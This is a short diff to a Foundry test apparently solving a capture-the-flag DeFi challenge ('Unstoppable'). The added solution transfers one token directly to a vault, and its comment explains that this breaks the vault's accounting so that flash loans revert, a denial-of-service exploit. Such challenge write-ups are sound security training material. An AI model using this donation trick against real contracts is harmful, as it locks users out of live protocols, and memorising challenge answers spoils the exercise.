@@ -47,6 +47,10 @@ contract UnstoppableTest is BaseTest {
 
   function testDoSFlashLoans() public {
     /** CODE YOUR SOLUTION HERE */
+    vm.startPrank(player);
+    token.transfer(address(vault), 1);
+    // @note Transferring tokens via normal transfer to the vault makes the 2 tokens accounting to mismatch, 
+    // causing a revert and DoSing the function
 
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
